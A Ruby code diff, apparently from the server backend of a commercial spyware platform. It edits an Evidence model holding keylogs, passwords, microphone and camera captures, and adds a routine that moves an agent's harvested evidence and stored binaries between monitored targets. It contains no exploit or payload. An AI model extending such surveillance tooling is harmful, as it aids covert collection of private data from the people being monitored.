@@ -5,6 +5,7 @@ require_relative '../shard'
 #module DB
 
 class Evidence
+  extend RCS::Tracer
 
   TYPES = ["addressbook", "application", "calendar", "call", "camera", "chat", "clipboard", "device",
            "file", "keylog", "position", "message", "mic", "mouse", "password", "print", "screenshot", "url"]
@@ -31,7 +32,7 @@ class Evidence
         store_in Evidence.collection_name('#{target}')
 
         after_create :create_callback
-        after_destroy :destroy_callback
+        before_destroy :destroy_callback
 
         index :type
         index :da
@@ -91,12 +92,12 @@ class Evidence
   def self.deep_copy(src, dst)
     dst.da = src.da
     dst.dr = src.dr
-    dst.blo = src.blo
-    dst.data = src.data
-    dst.aid = src.aid
-    dst.note = src.note
+    dst.aid = src.aid.dup
+    dst.type = src.type.dup
     dst.rel = src.rel
-    dst.type = src.type
+    dst.blo = src.blo
+    dst.data = src.data.dup
+    dst.note = src.note.dup unless src.note.nil?
   end
 
   def self.filter(params)
@@ -228,6 +229,42 @@ class Evidence
     end
 
     return filter, filter_hash, target_id
+  end
+
+
+  def self.offload_move_evidence(params)
+    old_target = ::Item.find(params[:old_target_id])
+    target = ::Item.find(params[:target_id])
+    agent = ::Item.find(params[:agent_id])
+
+    evidences = Evidence.collection_class(old_target[:_id]).where(:aid => agent[:_id])
+
+    trace :info, "Moving #{evidences.count} evidence for agent #{agent.name} to target #{target.name}"
+
+    # copy the new evidence
+    evidences.each do |old_ev|
+      # deep copy the evidence from one collection to the other
+      new_ev = Evidence.dynamic_new(target[:_id])
+      Evidence.deep_copy(old_ev, new_ev)
+
+      # move the binary content
+      if old_ev.data['_grid']
+        bin = RCS::DB::GridFS.get(old_ev.data['_grid'], old_target[:_id].to_s)
+        new_ev.data['_grid'] = RCS::DB::GridFS.put(bin, {filename: agent[:_id].to_s}, target[:_id].to_s) unless bin.nil?
+        new_ev.data['_grid_size'] = old_ev.data['_grid_size']
+      end
+
+      # save the new one
+      new_ev.save
+
+      # delete the old one. NOTE CAREFULLY:
+      # we use delete + explicit grid, since the callback in the destroy will fail
+      # because the parent of aid in the evidence is already the new one
+      old_ev.delete
+      RCS::DB::GridFS.delete(old_ev.data['_grid'], old_target[:_id].to_s) unless old_ev.data['_grid'].nil?
+    end
+
+    trace :info, "Moving finished for #{agent._kind} #{agent.name}"
   end
 
 end
